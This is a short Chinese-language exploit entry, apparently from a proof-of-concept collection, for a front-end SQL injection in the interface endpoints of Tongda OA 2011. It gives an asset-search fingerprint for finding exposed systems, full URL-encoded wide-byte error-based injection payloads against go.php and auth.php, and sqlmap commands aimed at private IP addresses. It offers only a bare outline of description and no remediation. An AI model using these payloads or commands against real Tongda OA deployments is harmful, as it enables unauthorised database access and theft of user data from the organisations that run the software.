# 通达OAinterface存在前台SQL注入漏洞

- **系统**：通达OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="通达 OA"`
- **请求**：`http://192.168.43.219/interface/go.php?PASSWORD=1&USER_ID=11%bf%27%20and%20(SELECT%201%20from%20(select%20count(*),concat(floor(rand(0)*2),(substring((select%20md5(1122)%20from%20user%20limit%201),1,62)))a%20from%20information_schema.tables%20group%20by%20a)b)%23`

**请求体 / payload**
```
poc1
/interface/auth.php?PASSWORD=1&USER_ID=11%bf%27%20and%20(SELECT%201%20from%20(select%20count(*),concat(floor(rand(0)*2),(substring((select%20md5(1122)%20from%20user%20limit%201),1,62)))a%20from%20information_schema.tables%20group%20by%20a)b)%23

sqlmap
sqlmap -u "http://192.168.31.164/interface/auth.php?PASSWORD=1&USER_ID=%df%27%20" --batch --is-dba

poc2

sqlmap
sqlmap -u "http://192.168.43.219/interface/go.php?PASSWORD=1&USER_ID=%df%27%20" --batch
```

**其他**
- 通达OA interface存在前台SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 通达OA2011